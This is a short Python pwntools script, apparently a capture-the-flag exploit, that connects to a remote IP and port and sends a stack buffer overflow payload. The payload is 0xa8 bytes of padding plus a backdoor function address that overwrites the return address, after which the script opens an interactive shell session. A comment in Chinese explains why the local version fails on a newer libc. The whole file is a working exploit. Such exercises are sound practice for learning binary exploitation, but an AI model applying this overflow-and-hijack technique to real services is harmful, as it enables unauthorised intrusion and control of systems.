from pwn import *

# p = process('../file/pwn2') # 本地最新libc2.35上无法成功，应该是要把rbp修改为合适的值才行
p = remote('61.147.171.105', '52753')

pause()

backdoor_addr = 0x400762
payload = b'a' * 0xa8 + p64(backdoor_addr)

p.recvline()
p.sendline(payload)

p.interactive()